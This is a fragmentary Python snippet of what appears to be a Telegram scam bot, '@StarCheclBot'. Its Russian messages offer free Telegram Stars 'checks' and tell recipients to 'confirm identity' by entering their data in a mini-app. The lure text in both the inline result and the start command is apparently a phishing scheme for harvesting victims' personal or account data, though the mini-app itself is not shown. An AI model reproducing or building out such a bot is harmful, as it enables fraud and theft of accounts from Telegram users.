        ...
        results.append(
            InlineQueryResultArticle(
                ...
                input_message_content=InputTextMessageContent(
                    ...
                    f"👇 Нажми на кнопку ниже, чтобы подтвердить личность и забрать звёзды.",
                    parse_mode='Markdown'
                ),
...
def start_cmd(message):
    bot.send_message(
        ...
        "🔹 Напиши **@StarCheclBot** в любом чате.\n"
        "🔹 Выбери сумму чека.\n"
        "🔹 Нажми на кнопку **'Забрать звёзд'**.\n"
        "🔹 Введи свои данные в мини-приложении.\n\n"
